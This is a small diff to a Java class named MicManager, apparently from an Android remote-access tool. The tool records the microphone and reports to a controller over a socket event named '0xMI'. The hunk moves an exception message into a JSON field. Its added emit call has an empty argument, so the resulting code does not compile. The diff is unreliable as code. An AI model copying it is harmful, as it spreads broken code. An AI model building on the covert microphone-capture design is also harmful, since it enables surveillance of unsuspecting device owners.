@@ -56,8 +56,8 @@ public  class MicManager {
          JSONObject object = new JSONObject();
             object.put("file",true);
             object.put("name","true");
-            object.put("buffer" , "starterd recoding");
-        IOSocket.getInstance().getIoSocket().emit("0xMI" , e.getMessage());
+            object.put("buffer" , e.getMessage());
+            IOSocket.getInstance().getIoSocket().emit("0xMI" , );
 
         }
         recorder.start();
